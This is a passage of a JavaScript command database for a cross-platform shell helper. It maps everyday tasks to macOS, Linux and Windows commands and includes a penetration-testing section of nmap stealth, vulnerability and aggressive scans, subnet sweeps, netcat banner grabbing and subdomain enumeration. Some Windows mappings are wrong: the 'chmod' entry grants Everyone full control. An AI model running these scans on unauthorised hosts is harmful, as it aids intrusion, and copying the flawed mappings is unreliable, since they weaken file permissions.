// Command Database - Contains all commands organized by category
const commandDatabase = {
    // File Operations
    file: {
        label: "File Operations",
        actions: {
            create: {
                label: "Create a file",
                parameters: [
                    { name: "filename", placeholder: "Enter filename (e.g., myfile.txt)", required: true }
                ],
                commands: {
                    macos: { cmd: "touch {filename}", explanation: "Creates an empty file with the specified name. If the file exists, updates its timestamp." },
                    linux: { cmd: "touch {filename}", explanation: "Creates an empty file with the specified name. If the file exists, updates its timestamp." },
                    windows: { cmd: "type nul > {filename}", explanation: "Creates an empty file by redirecting null output to the specified filename." }
                }
            },
            delete: {
                label: "Delete a file",
                parameters: [
                    { name: "filename", placeholder: "Enter filename to delete", required: true }
                ],
                commands: {
                    macos: { cmd: "rm {filename}", explanation: "Removes the specified file permanently. Use -i flag for interactive confirmation." },
                    linux: { cmd: "rm {filename}", explanation: "Removes the specified file permanently. Use -i flag for interactive confirmation." },
                    windows: { cmd: "del {filename}", explanation: "Deletes the specified file. Use /P flag to prompt for confirmation." }
                }
            },
            copy: {
                label: "Copy a file",
                parameters: [
                    { name: "source", placeholder: "Source file path", required: true },
                    { name: "destination", placeholder: "Destination path", required: true }
                ],
                commands: {
                    macos: { cmd: "cp {source} {destination}", explanation: "Copies the source file to the destination. Use -r for directories." },
                    linux: { cmd: "cp {source} {destination}", explanation: "Copies the source file to the destination. Use -r for directories." },
                    windows: { cmd: "copy {source} {destination}", explanation: "Copies one or more files to another location." }
                }
            },
            move: {
                label: "Move/Rename a file",
                parameters: [
                    { name: "source", placeholder: "Current file path/name", required: true },
                    { name: "destination", placeholder: "New path/name", required: true }
                ],
                commands: {
                    macos: { cmd: "mv {source} {destination}", explanation: "Moves or renames files and directories." },
                    linux: { cmd: "mv {source} {destination}", explanation: "Moves or renames files and directories." },
                    windows: { cmd: "move {source} {destination}", explanation: "Moves files from one directory to another." }
                }
            },
            view: {
                label: "View file contents",
                parameters: [
                    { name: "filename", placeholder: "Enter filename to view", required: true }
                ],
                commands: {
                    macos: { cmd: "cat {filename}", explanation: "Displays the entire contents of the file. Use 'less' for large files." },
                    linux: { cmd: "cat {filename}", explanation: "Displays the entire contents of the file. Use 'less' for large files." },
                    windows: { cmd: "type {filename}", explanation: "Displays the contents of a text file." }
                }
            },
            size: {
                label: "Get file size",
                parameters: [
                    { name: "filename", placeholder: "Enter filename", required: true }
                ],
                commands: {
                    macos: { cmd: "ls -lh {filename}", explanation: "Shows file details including human-readable size." },
                    linux: { cmd: "ls -lh {filename}", explanation: "Shows file details including human-readable size." },
                    windows: { cmd: "dir {filename}", explanation: "Displays file information including size in bytes." }
                }
            }
        }
    },

    // Directory Operations
    directory: {
        label: "Directory Operations",
        actions: {
            create: {
                label: "Create a directory",
                parameters: [
                    { name: "dirname", placeholder: "Enter directory name", required: true }
                ],
                commands: {
                    macos: { cmd: "mkdir {dirname}", explanation: "Creates a new directory. Use -p to create parent directories as needed." },
                    linux: { cmd: "mkdir {dirname}", explanation: "Creates a new directory. Use -p to create parent directories as needed." },
                    windows: { cmd: "mkdir {dirname}", explanation: "Creates a new directory or subdirectory." }
                }
            },
            delete: {
                label: "Delete a directory",
                parameters: [
                    { name: "dirname", placeholder: "Enter directory name", required: true }
                ],
                commands: {
                    macos: { cmd: "rm -rf {dirname}", explanation: "Recursively removes the directory and all its contents. Use with caution!" },
                    linux: { cmd: "rm -rf {dirname}", explanation: "Recursively removes the directory and all its contents. Use with caution!" },
                    windows: { cmd: "rmdir /s /q {dirname}", explanation: "Removes a directory and all subdirectories. /s removes all, /q quiet mode." }
                }
            },
            list: {
                label: "List directory contents",
                parameters: [
                    { name: "path", placeholder: "Directory path (leave empty for current)", required: false }
                ],
                commands: {
                    macos: { cmd: "ls -la {path}", explanation: "Lists all files including hidden ones with detailed information." },
                    linux: { cmd: "ls -la {path}", explanation: "Lists all files including hidden ones with detailed information." },
                    windows: { cmd: "dir /a {path}", explanation: "Lists all files including hidden and system files." }
                }
            },
            navigate: {
                label: "Change directory",
                parameters: [
                    { name: "path", placeholder: "Directory path to navigate to", required: true }
                ],
                commands: {
                    macos: { cmd: "cd {path}", explanation: "Changes the current working directory to the specified path." },
                    linux: { cmd: "cd {path}", explanation: "Changes the current working directory to the specified path." },
                    windows: { cmd: "cd {path}", explanation: "Changes the current directory to the specified path." }
                }
            },
            current: {
                label: "Show current directory",
                parameters: [],
                commands: {
                    macos: { cmd: "pwd", explanation: "Prints the full path of the current working directory." },
                    linux: { cmd: "pwd", explanation: "Prints the full path of the current working directory." },
                    windows: { cmd: "cd", explanation: "Displays the name of the current directory." }
                }
            },
            tree: {
                label: "Show directory tree",
                parameters: [
                    { name: "path", placeholder: "Directory path (leave empty for current)", required: false }
                ],
                commands: {
                    macos: { cmd: "find {path} -print | sed -e 's;[^/]*/;|____;g;s;____|; |;g'", explanation: "Displays a tree-like directory structure. Install 'tree' for better output." },
                    linux: { cmd: "tree {path}", explanation: "Displays a tree-like directory structure. Install with: apt install tree" },
                    windows: { cmd: "tree {path} /F", explanation: "Graphically displays the folder structure. /F includes files." }
                }
            }
        }
    },

    // System Information
    system: {
        label: "System Information",
        actions: {
            info: {
                label: "System information",
                parameters: [],
                commands: {
                    macos: { cmd: "system_profiler SPSoftwareDataType SPHardwareDataType", explanation: "Displays detailed system hardware and software information." },
                    linux: { cmd: "uname -a && lsb_release -a", explanation: "Shows kernel version and distribution information." },
                    windows: { cmd: "systeminfo", explanation: "Displays detailed configuration information about the computer." }
                }
            },
            memory: {
                label: "Memory usage",
                parameters: [],
                commands: {
                    macos: { cmd: "top -l 1 | head -n 10", explanation: "Shows memory and CPU usage summary." },
                    linux: { cmd: "free -h", explanation: "Displays memory usage in human-readable format." },
                    windows: { cmd: "systeminfo | findstr Memory", explanation: "Shows physical and virtual memory information." }
                }
            },
            disk: {
                label: "Disk usage",
                parameters: [],
                commands: {
                    macos: { cmd: "df -h", explanation: "Shows disk space usage for all mounted filesystems in human-readable format." },
                    linux: { cmd: "df -h", explanation: "Shows disk space usage for all mounted filesystems in human-readable format." },
                    windows: { cmd: "wmic logicaldisk get size,freespace,caption", explanation: "Displays disk drive information including size and free space." }
                }
            },
            cpu: {
                label: "CPU information",
                parameters: [],
                commands: {
                    macos: { cmd: "sysctl -n machdep.cpu.brand_string", explanation: "Shows the CPU model and brand information." },
                    linux: { cmd: "lscpu", explanation: "Displays detailed CPU architecture information." },
                    windows: { cmd: "wmic cpu get name,numberofcores,maxclockspeed", explanation: "Shows CPU name, cores, and clock speed." }
                }
            },
            uptime: {
                label: "System uptime",
                parameters: [],
                commands: {
                    macos: { cmd: "uptime", explanation: "Shows how long the system has been running." },
                    linux: { cmd: "uptime", explanation: "Shows how long the system has been running." },
                    windows: { cmd: "net statistics server", explanation: "Shows server statistics including uptime." }
                }
            },
            hostname: {
                label: "Show hostname",
                parameters: [],
                commands: {
                    macos: { cmd: "hostname", explanation: "Displays the system's network hostname." },
                    linux: { cmd: "hostname", explanation: "Displays the system's network hostname." },
                    windows: { cmd: "hostname", explanation: "Displays the computer's network name." }
                }
            }
        }
    },

    // Networking
    network: {
        label: "Networking",
        actions: {
            ip: {
                label: "Show IP address",
                parameters: [],
                commands: {
                    macos: { cmd: "ifconfig | grep 'inet '", explanation: "Displays network interface IP addresses." },
                    linux: { cmd: "ip addr show", explanation: "Shows all network interface addresses and details." },
                    windows: { cmd: "ipconfig", explanation: "Displays IP address configuration for all adapters." }
                }
            },
            ping: {
                label: "Ping a host",
                parameters: [
                    { name: "host", placeholder: "Enter hostname or IP (e.g., google.com)", required: true }
                ],
                commands: {
                    macos: { cmd: "ping -c 4 {host}", explanation: "Sends 4 ICMP echo requests to test connectivity." },
                    linux: { cmd: "ping -c 4 {host}", explanation: "Sends 4 ICMP echo requests to test connectivity." },
                    windows: { cmd: "ping {host}", explanation: "Sends ICMP echo requests to test network connectivity." }
                }
            },
            ports: {
                label: "Show open ports",
                parameters: [],
                commands: {
                    macos: { cmd: "lsof -i -P -n | grep LISTEN", explanation: "Lists all listening network ports and their processes." },
                    linux: { cmd: "ss -tulpn", explanation: "Shows all listening TCP and UDP ports with process info." },
                    windows: { cmd: "netstat -an | findstr LISTENING", explanation: "Displays all listening ports on the system." }
                }
            },
            dns: {
                label: "DNS lookup",
                parameters: [
                    { name: "domain", placeholder: "Enter domain name", required: true }
                ],
                commands: {
                    macos: { cmd: "nslookup {domain}", explanation: "Queries DNS servers for domain information." },
                    linux: { cmd: "nslookup {domain}", explanation: "Queries DNS servers for domain information." },
                    windows: { cmd: "nslookup {domain}", explanation: "Queries DNS servers for domain information." }
                }
            },
            route: {
                label: "Show routing table",
                parameters: [],
                commands: {
                    macos: { cmd: "netstat -rn", explanation: "Displays the kernel routing table." },
                    linux: { cmd: "ip route show", explanation: "Shows the routing table entries." },
                    windows: { cmd: "route print", explanation: "Displays the routing table." }
                }
            },
            wget: {
                label: "Download a file",
                parameters: [
                    { name: "url", placeholder: "Enter URL to download", required: true }
                ],
                commands: {
                    macos: { cmd: "curl -O {url}", explanation: "Downloads a file from the URL, keeping the original filename." },
                    linux: { cmd: "wget {url}", explanation: "Downloads a file from the specified URL." },
                    windows: { cmd: "curl -O {url}", explanation: "Downloads a file from the URL using curl (Windows 10+)." }
                }
            }
        }
    },

    // Process Management
    process: {
        label: "Process Management",
        actions: {
            list: {
                label: "List all processes",
                parameters: [],
                commands: {
                    macos: { cmd: "ps aux", explanation: "Shows all running processes with detailed information." },
                    linux: { cmd: "ps aux", explanation: "Shows all running processes with detailed information." },
                    windows: { cmd: "tasklist", explanation: "Displays a list of all running processes." }
                }
            },
            find: {
                label: "Find a process",
                parameters: [
                    { name: "name", placeholder: "Process name to search for", required: true }
                ],
                commands: {
                    macos: { cmd: "ps aux | grep {name}", explanation: "Searches for processes matching the specified name." },
                    linux: { cmd: "ps aux | grep {name}", explanation: "Searches for processes matching the specified name." },
                    windows: { cmd: "tasklist | findstr {name}", explanation: "Finds processes containing the specified name." }
                }
            },
            kill: {
                label: "Kill a process by name",
                parameters: [
                    { name: "name", placeholder: "Process name to kill", required: true }
                ],
                commands: {
                    macos: { cmd: "pkill {name}", explanation: "Kills all processes matching the specified name." },
                    linux: { cmd: "pkill {name}", explanation: "Kills all processes matching the specified name." },
                    windows: { cmd: "taskkill /IM {name} /F", explanation: "Forcefully terminates processes with the specified name." }
                }
            },
            killpid: {
                label: "Kill a process by PID",
                parameters: [
                    { name: "pid", placeholder: "Process ID number", required: true }
                ],
                commands: {
                    macos: { cmd: "kill -9 {pid}", explanation: "Forcefully terminates the process with the specified ID." },
                    linux: { cmd: "kill -9 {pid}", explanation: "Forcefully terminates the process with the specified ID." },
                    windows: { cmd: "taskkill /PID {pid} /F", explanation: "Forcefully terminates the process with the specified ID." }
                }
            },
            top: {
                label: "Monitor processes (real-time)",
                parameters: [],
                commands: {
                    macos: { cmd: "top", explanation: "Displays real-time process activity. Press 'q' to quit." },
                    linux: { cmd: "htop", explanation: "Interactive process viewer. Install with: apt install htop" },
                    windows: { cmd: "tasklist /V", explanation: "Shows detailed process information. Use Task Manager for real-time." }
                }
            }
        }
    },

    // Package Management
    package: {
        label: "Package Management",
        actions: {
            update: {
                label: "Update package list",
                parameters: [],
                commands: {
                    macos: { cmd: "brew update", explanation: "Updates Homebrew package definitions." },
                    linux: { cmd: "sudo apt update", explanation: "Updates the package index from repositories." },
                    windows: { cmd: "winget source update", explanation: "Updates the package source (Windows Package Manager)." }
                }
            },
            upgrade: {
                label: "Upgrade all packages",
                parameters: [],
                commands: {
                    macos: { cmd: "brew upgrade", explanation: "Upgrades all installed Homebrew packages." },
                    linux: { cmd: "sudo apt upgrade -y", explanation: "Upgrades all installed packages to newest versions." },
                    windows: { cmd: "winget upgrade --all", explanation: "Upgrades all installed packages." }
                }
            },
            install: {
                label: "Install a package",
                parameters: [
                    { name: "package", placeholder: "Package name to install", required: true }
                ],
                commands: {
                    macos: { cmd: "brew install {package}", explanation: "Installs the specified package using Homebrew." },
                    linux: { cmd: "sudo apt install {package} -y", explanation: "Installs the specified package from repositories." },
                    windows: { cmd: "winget install {package}", explanation: "Installs the specified package using Windows Package Manager." }
                }
            },
            remove: {
                label: "Remove a package",
                parameters: [
                    { name: "package", placeholder: "Package name to remove", required: true }
                ],
                commands: {
                    macos: { cmd: "brew uninstall {package}", explanation: "Removes the specified Homebrew package." },
                    linux: { cmd: "sudo apt remove {package} -y", explanation: "Removes the specified package." },
                    windows: { cmd: "winget uninstall {package}", explanation: "Removes the specified package." }
                }
            },
            search: {
                label: "Search for a package",
                parameters: [
                    { name: "query", placeholder: "Search term", required: true }
                ],
                commands: {
                    macos: { cmd: "brew search {query}", explanation: "Searches for packages matching the query." },
                    linux: { cmd: "apt search {query}", explanation: "Searches the package index for matching packages." },
                    windows: { cmd: "winget search {query}", explanation: "Searches for packages matching the query." }
                }
            },
            list: {
                label: "List installed packages",
                parameters: [],
                commands: {
                    macos: { cmd: "brew list", explanation: "Lists all installed Homebrew packages." },
                    linux: { cmd: "apt list --installed", explanation: "Lists all installed packages." },
                    windows: { cmd: "winget list", explanation: "Lists all installed packages." }
                }
            }
        }
    },

    // Git Commands
    git: {
        label: "Git Commands",
        actions: {
            clone: {
                label: "Clone a repository",
                parameters: [
                    { name: "url", placeholder: "Repository URL", required: true }
                ],
                commands: {
                    macos: { cmd: "git clone {url}", explanation: "Creates a local copy of a remote repository." },
                    linux: { cmd: "git clone {url}", explanation: "Creates a local copy of a remote repository." },
                    windows: { cmd: "git clone {url}", explanation: "Creates a local copy of a remote repository." }
                }
            },
            status: {
                label: "Check repository status",
                parameters: [],
                commands: {
                    macos: { cmd: "git status", explanation: "Shows the working tree status and staged changes." },
                    linux: { cmd: "git status", explanation: "Shows the working tree status and staged changes." },
                    windows: { cmd: "git status", explanation: "Shows the working tree status and staged changes." }
                }
            },
            add: {
                label: "Stage changes",
                parameters: [
                    { name: "files", placeholder: "Files to stage (use . for all)", required: true }
                ],
                commands: {
                    macos: { cmd: "git add {files}", explanation: "Adds file changes to the staging area." },
                    linux: { cmd: "git add {files}", explanation: "Adds file changes to the staging area." },
                    windows: { cmd: "git add {files}", explanation: "Adds file changes to the staging area." }
                }
            },
            commit: {
                label: "Commit changes",
                parameters: [
                    { name: "message", placeholder: "Commit message", required: true }
                ],
                commands: {
                    macos: { cmd: "git commit -m \"{message}\"", explanation: "Records staged changes with a descriptive message." },
                    linux: { cmd: "git commit -m \"{message}\"", explanation: "Records staged changes with a descriptive message." },
                    windows: { cmd: "git commit -m \"{message}\"", explanation: "Records staged changes with a descriptive message." }
                }
            },
            push: {
                label: "Push to remote",
                parameters: [
                    { name: "branch", placeholder: "Branch name (e.g., main)", required: true }
                ],
                commands: {
                    macos: { cmd: "git push origin {branch}", explanation: "Uploads local commits to the remote repository." },
                    linux: { cmd: "git push origin {branch}", explanation: "Uploads local commits to the remote repository." },
                    windows: { cmd: "git push origin {branch}", explanation: "Uploads local commits to the remote repository." }
                }
            },
            pull: {
                label: "Pull from remote",
                parameters: [],
                commands: {
                    macos: { cmd: "git pull", explanation: "Fetches and integrates changes from the remote repository." },
                    linux: { cmd: "git pull", explanation: "Fetches and integrates changes from the remote repository." },
                    windows: { cmd: "git pull", explanation: "Fetches and integrates changes from the remote repository." }
                }
            },
            branch: {
                label: "Create a new branch",
                parameters: [
                    { name: "name", placeholder: "New branch name", required: true }
                ],
                commands: {
                    macos: { cmd: "git checkout -b {name}", explanation: "Creates and switches to a new branch." },
                    linux: { cmd: "git checkout -b {name}", explanation: "Creates and switches to a new branch." },
                    windows: { cmd: "git checkout -b {name}", explanation: "Creates and switches to a new branch." }
                }
            },
            log: {
                label: "View commit history",
                parameters: [],
                commands: {
                    macos: { cmd: "git log --oneline -10", explanation: "Shows the last 10 commits in a compact format." },
                    linux: { cmd: "git log --oneline -10", explanation: "Shows the last 10 commits in a compact format." },
                    windows: { cmd: "git log --oneline -10", explanation: "Shows the last 10 commits in a compact format." }
                }
            }
        }
    },

    // Docker Commands
    docker: {
        label: "Docker Commands",
        actions: {
            ps: {
                label: "List running containers",
                parameters: [],
                commands: {
                    macos: { cmd: "docker ps", explanation: "Lists all running Docker containers." },
                    linux: { cmd: "docker ps", explanation: "Lists all running Docker containers." },
                    windows: { cmd: "docker ps", explanation: "Lists all running Docker containers." }
                }
            },
            images: {
                label: "List images",
                parameters: [],
                commands: {
                    macos: { cmd: "docker images", explanation: "Lists all Docker images on the system." },
                    linux: { cmd: "docker images", explanation: "Lists all Docker images on the system." },
                    windows: { cmd: "docker images", explanation: "Lists all Docker images on the system." }
                }
            },
            run: {
                label: "Run a container",
                parameters: [
                    { name: "image", placeholder: "Image name (e.g., nginx)", required: true }
                ],
                commands: {
                    macos: { cmd: "docker run -d {image}", explanation: "Runs a container in detached mode from the specified image." },
                    linux: { cmd: "docker run -d {image}", explanation: "Runs a container in detached mode from the specified image." },
                    windows: { cmd: "docker run -d {image}", explanation: "Runs a container in detached mode from the specified image." }
                }
            },
            stop: {
                label: "Stop a container",
                parameters: [
                    { name: "container", placeholder: "Container ID or name", required: true }
                ],
                commands: {
                    macos: { cmd: "docker stop {container}", explanation: "Stops a running container gracefully." },
                    linux: { cmd: "docker stop {container}", explanation: "Stops a running container gracefully." },
                    windows: { cmd: "docker stop {container}", explanation: "Stops a running container gracefully." }
                }
            },
            rm: {
                label: "Remove a container",
                parameters: [
                    { name: "container", placeholder: "Container ID or name", required: true }
                ],
                commands: {
                    macos: { cmd: "docker rm {container}", explanation: "Removes a stopped container." },
                    linux: { cmd: "docker rm {container}", explanation: "Removes a stopped container." },
                    windows: { cmd: "docker rm {container}", explanation: "Removes a stopped container." }
                }
            },
            logs: {
                label: "View container logs",
                parameters: [
                    { name: "container", placeholder: "Container ID or name", required: true }
                ],
                commands: {
                    macos: { cmd: "docker logs -f {container}", explanation: "Follows the log output of a container." },
                    linux: { cmd: "docker logs -f {container}", explanation: "Follows the log output of a container." },
                    windows: { cmd: "docker logs -f {container}", explanation: "Follows the log output of a container." }
                }
            },
            exec: {
                label: "Execute command in container",
                parameters: [
                    { name: "container", placeholder: "Container ID or name", required: true }
                ],
                commands: {
                    macos: { cmd: "docker exec -it {container} /bin/bash", explanation: "Opens an interactive bash shell in the container." },
                    linux: { cmd: "docker exec -it {container} /bin/bash", explanation: "Opens an interactive bash shell in the container." },
                    windows: { cmd: "docker exec -it {container} /bin/bash", explanation: "Opens an interactive bash shell in the container." }
                }
            }
        }
    },

    // Permissions & Ownership
    permissions: {
        label: "Permissions & Ownership",
        actions: {
            chmod: {
                label: "Change file permissions",
                parameters: [
                    { name: "permissions", placeholder: "Permissions (e.g., 755 or u+x)", required: true },
                    { name: "file", placeholder: "File or directory path", required: true }
                ],
                commands: {
                    macos: { cmd: "chmod {permissions} {file}", explanation: "Changes the access permissions of a file or directory." },
                    linux: { cmd: "chmod {permissions} {file}", explanation: "Changes the access permissions of a file or directory." },
                    windows: { cmd: "icacls {file} /grant Everyone:F", explanation: "Modifies file permissions using Windows ACLs." }
                }
            },
            chown: {
                label: "Change file owner",
                parameters: [
                    { name: "owner", placeholder: "New owner (user:group)", required: true },
                    { name: "file", placeholder: "File or directory path", required: true }
                ],
                commands: {
                    macos: { cmd: "sudo chown {owner} {file}", explanation: "Changes the owner and/or group of a file." },
                    linux: { cmd: "sudo chown {owner} {file}", explanation: "Changes the owner and/or group of a file." },
                    windows: { cmd: "takeown /F {file}", explanation: "Takes ownership of a file (run as Administrator)." }
                }
            },
            executable: {
                label: "Make file executable",
                parameters: [
                    { name: "file", placeholder: "File path", required: true }
                ],
                commands: {
                    macos: { cmd: "chmod +x {file}", explanation: "Adds execute permission to the file." },
                    linux: { cmd: "chmod +x {file}", explanation: "Adds execute permission to the file." },
                    windows: { cmd: "Set-ExecutionPolicy -ExecutionPolicy RemoteSigned", explanation: "Allows execution of scripts (PowerShell, run as Admin)." }
                }
            },
            viewperms: {
                label: "View file permissions",
                parameters: [
                    { name: "file", placeholder: "File path", required: true }
                ],
                commands: {
                    macos: { cmd: "ls -la {file}", explanation: "Shows detailed file information including permissions." },
                    linux: { cmd: "ls -la {file}", explanation: "Shows detailed file information including permissions." },
                    windows: { cmd: "icacls {file}", explanation: "Displays file access control lists." }
                }
            }
        }
    },

    // Search & Find
    search: {
        label: "Search & Find",
        actions: {
            findfile: {
                label: "Find files by name",
                parameters: [
                    { name: "pattern", placeholder: "File name pattern (e.g., *.txt)", required: true }
                ],
                commands: {
                    macos: { cmd: "find . -name \"{pattern}\"", explanation: "Searches for files matching the pattern in current directory." },
                    linux: { cmd: "find . -name \"{pattern}\"", explanation: "Searches for files matching the pattern in current directory." },
                    windows: { cmd: "dir /s /b {pattern}", explanation: "Searches for files matching the pattern recursively." }
                }
            },
            grep: {
                label: "Search text in files",
                parameters: [
                    { name: "text", placeholder: "Text to search for", required: true },
                    { name: "path", placeholder: "File or directory path", required: true }
                ],
                commands: {
                    macos: { cmd: "grep -r \"{text}\" {path}", explanation: "Recursively searches for text in files." },
                    linux: { cmd: "grep -r \"{text}\" {path}", explanation: "Recursively searches for text in files." },
                    windows: { cmd: "findstr /s \"{text}\" {path}\\*", explanation: "Searches for text strings in files." }
                }
            },
            locate: {
                label: "Quick file search (indexed)",
                parameters: [
                    { name: "filename", placeholder: "File name to locate", required: true }
                ],
                commands: {
                    macos: { cmd: "mdfind -name {filename}", explanation: "Uses Spotlight index to quickly find files." },
                    linux: { cmd: "locate {filename}", explanation: "Uses the locate database for fast file search." },
                    windows: { cmd: "where /r C:\\ {filename}", explanation: "Searches for files starting from C:\\ drive." }
                }
            },
            findsize: {
                label: "Find large files",
                parameters: [
                    { name: "size", placeholder: "Minimum size (e.g., 100M)", required: true }
                ],
                commands: {
                    macos: { cmd: "find . -size +{size}", explanation: "Finds files larger than the specified size." },
                    linux: { cmd: "find . -size +{size}", explanation: "Finds files larger than the specified size." },
                    windows: { cmd: "forfiles /S /M * /C \"cmd /c if @fsize GEQ 104857600 echo @path\"", explanation: "Finds files larger than 100MB." }
                }
            }
        }
    },

    // Compression & Archives
    compression: {
        label: "Compression & Archives",
        actions: {
            zip: {
                label: "Create a ZIP archive",
                parameters: [
                    { name: "archive", placeholder: "Archive name (e.g., files.zip)", required: true },
                    { name: "files", placeholder: "Files/folders to compress", required: true }
                ],
                commands: {
                    macos: { cmd: "zip -r {archive} {files}", explanation: "Creates a ZIP archive recursively." },
                    linux: { cmd: "zip -r {archive} {files}", explanation: "Creates a ZIP archive recursively." },
                    windows: { cmd: "Compress-Archive -Path {files} -DestinationPath {archive}", explanation: "Creates a ZIP archive using PowerShell." }
                }
            },
            unzip: {
                label: "Extract a ZIP archive",
                parameters: [
                    { name: "archive", placeholder: "Archive file path", required: true }
                ],
                commands: {
                    macos: { cmd: "unzip {archive}", explanation: "Extracts files from a ZIP archive." },
                    linux: { cmd: "unzip {archive}", explanation: "Extracts files from a ZIP archive." },
                    windows: { cmd: "Expand-Archive -Path {archive} -DestinationPath .", explanation: "Extracts a ZIP archive using PowerShell." }
                }
            },
            tar: {
                label: "Create a TAR archive",
                parameters: [
                    { name: "archive", placeholder: "Archive name (e.g., files.tar.gz)", required: true },
                    { name: "files", placeholder: "Files/folders to compress", required: true }
                ],
                commands: {
                    macos: { cmd: "tar -czvf {archive} {files}", explanation: "Creates a gzip-compressed TAR archive." },
                    linux: { cmd: "tar -czvf {archive} {files}", explanation: "Creates a gzip-compressed TAR archive." },
                    windows: { cmd: "tar -czvf {archive} {files}", explanation: "Creates a TAR archive (Windows 10+)." }
                }
            },
            untar: {
                label: "Extract a TAR archive",
                parameters: [
                    { name: "archive", placeholder: "Archive file path", required: true }
                ],
                commands: {
                    macos: { cmd: "tar -xzvf {archive}", explanation: "Extracts files from a gzip-compressed TAR archive." },
                    linux: { cmd: "tar -xzvf {archive}", explanation: "Extracts files from a gzip-compressed TAR archive." },
                    windows: { cmd: "tar -xzvf {archive}", explanation: "Extracts a TAR archive (Windows 10+)." }
                }
            }
        }
    },

    // Security & Penetration Testing
    security: {
        label: "Security & Penetration Testing",
        actions: {
            portscan: {
                label: "Port scan a host",
                parameters: [
                    { name: "target", placeholder: "Target IP or hostname", required: true }
                ],
                commands: {
                    macos: { cmd: "nmap {target}", explanation: "Scans common ports on the target host. Install with: brew install nmap" },
                    linux: { cmd: "nmap {target}", explanation: "Scans common ports on the target host. Install with: apt install nmap" },
                    windows: { cmd: "nmap {target}", explanation: "Scans common ports on the target. Download from nmap.org" }
                }
            },
            portscanfull: {
                label: "Full port scan (all ports)",
                parameters: [
                    { name: "target", placeholder: "Target IP or hostname", required: true }
                ],
                commands: {
                    macos: { cmd: "nmap -p- {target}", explanation: "Scans all 65535 ports on the target host." },
                    linux: { cmd: "nmap -p- {target}", explanation: "Scans all 65535 ports on the target host." },
                    windows: { cmd: "nmap -p- {target}", explanation: "Scans all 65535 ports on the target host." }
                }
            },
            servicedetect: {
                label: "Detect services/versions",
                parameters: [
                    { name: "target", placeholder: "Target IP or hostname", required: true }
                ],
                commands: {
                    macos: { cmd: "nmap -sV {target}", explanation: "Detects service versions running on open ports." },
                    linux: { cmd: "nmap -sV {target}", explanation: "Detects service versions running on open ports." },
                    windows: { cmd: "nmap -sV {target}", explanation: "Detects service versions running on open ports." }
                }
            },
            osdetect: {
                label: "OS detection scan",
                parameters: [
                    { name: "target", placeholder: "Target IP or hostname", required: true }
                ],
                commands: {
                    macos: { cmd: "sudo nmap -O {target}", explanation: "Attempts to detect the operating system of the target." },
                    linux: { cmd: "sudo nmap -O {target}", explanation: "Attempts to detect the operating system of the target." },
                    windows: { cmd: "nmap -O {target}", explanation: "Attempts to detect the operating system of the target." }
                }
            },
            stealthscan: {
                label: "Stealth SYN scan",
                parameters: [
                    { name: "target", placeholder: "Target IP or hostname", required: true }
                ],
                commands: {
                    macos: { cmd: "sudo nmap -sS {target}", explanation: "Performs a stealthy SYN scan (half-open scanning)." },
                    linux: { cmd: "sudo nmap -sS {target}", explanation: "Performs a stealthy SYN scan (half-open scanning)." },
                    windows: { cmd: "nmap -sS {target}", explanation: "Performs a stealthy SYN scan (half-open scanning)." }
                }
            },
            udpscan: {
                label: "UDP port scan",
                parameters: [
                    { name: "target", placeholder: "Target IP or hostname", required: true }
                ],
                commands: {
                    macos: { cmd: "sudo nmap -sU {target}", explanation: "Scans UDP ports on the target (slower than TCP scans)." },
                    linux: { cmd: "sudo nmap -sU {target}", explanation: "Scans UDP ports on the target (slower than TCP scans)." },
                    windows: { cmd: "nmap -sU {target}", explanation: "Scans UDP ports on the target (slower than TCP scans)." }
                }
            },
            vulnscan: {
                label: "Vulnerability scan",
                parameters: [
                    { name: "target", placeholder: "Target IP or hostname", required: true }
                ],
                commands: {
                    macos: { cmd: "nmap --script vuln {target}", explanation: "Runs vulnerability detection scripts against the target." },
                    linux: { cmd: "nmap --script vuln {target}", explanation: "Runs vulnerability detection scripts against the target." },
                    windows: { cmd: "nmap --script vuln {target}", explanation: "Runs vulnerability detection scripts against the target." }
                }
            },
            aggressivescan: {
                label: "Aggressive scan (OS, versions, scripts)",
                parameters: [
                    { name: "target", placeholder: "Target IP or hostname", required: true }
                ],
                commands: {
                    macos: { cmd: "sudo nmap -A {target}", explanation: "Aggressive scan: OS detection, version detection, script scanning, and traceroute." },
                    linux: { cmd: "sudo nmap -A {target}", explanation: "Aggressive scan: OS detection, version detection, script scanning, and traceroute." },
                    windows: { cmd: "nmap -A {target}", explanation: "Aggressive scan: OS detection, version detection, script scanning, and traceroute." }
                }
            },
            networksweep: {
                label: "Network host discovery",
                parameters: [
                    { name: "subnet", placeholder: "Subnet (e.g., 192.168.1.0/24)", required: true }
                ],
                commands: {
                    macos: { cmd: "nmap -sn {subnet}", explanation: "Discovers live hosts on the network without port scanning." },
                    linux: { cmd: "nmap -sn {subnet}", explanation: "Discovers live hosts on the network without port scanning." },
                    windows: { cmd: "nmap -sn {subnet}", explanation: "Discovers live hosts on the network without port scanning." }
                }
            },
            bannergrab: {
                label: "Banner grabbing",
                parameters: [
                    { name: "host", placeholder: "Target host", required: true },
                    { name: "port", placeholder: "Port number", required: true }
                ],
                commands: {
                    macos: { cmd: "nc -v {host} {port}", explanation: "Connects to the service and retrieves banner information." },
                    linux: { cmd: "nc -v {host} {port}", explanation: "Connects to the service and retrieves banner information." },
                    windows: { cmd: "ncat -v {host} {port}", explanation: "Connects to the service and retrieves banner information." }
                }
            },
            whois: {
                label: "WHOIS lookup",
                parameters: [
                    { name: "domain", placeholder: "Domain name", required: true }
                ],
                commands: {
                    macos: { cmd: "whois {domain}", explanation: "Queries domain registration information." },
                    linux: { cmd: "whois {domain}", explanation: "Queries domain registration information. Install with: apt install whois" },
                    windows: { cmd: "whois {domain}", explanation: "Queries domain registration information. Install from sysinternals." }
                }
            },
            dnsenum: {
                label: "DNS enumeration",
                parameters: [
                    { name: "domain", placeholder: "Domain name", required: true }
                ],
                commands: {
                    macos: { cmd: "dig {domain} ANY +noall +answer", explanation: "Retrieves all DNS records for the domain." },
                    linux: { cmd: "dig {domain} ANY +noall +answer", explanation: "Retrieves all DNS records for the domain." },
                    windows: { cmd: "nslookup -type=any {domain}", explanation: "Retrieves DNS records for the domain." }
                }
            },
            subdomainenum: {
                label: "Subdomain enumeration",
                parameters: [
                    { name: "domain", placeholder: "Domain name", required: true }
                ],
                commands: {
                    macos: { cmd: "subfinder -d {domain}", explanation: "Discovers subdomains using passive sources. Install with: brew install subfinder" },
                    linux: { cmd: "subfinder -d {domain}", explanation: "Discovers subdomains using passive sources. Install with: apt install subfinder" },
                    windows: { cmd: "subfinder -d {domain}", explanation: "Discovers subdomains using passive sources." }
                }
            },
            traceroute: {
                label: "Trace route to host",
                parameters: [
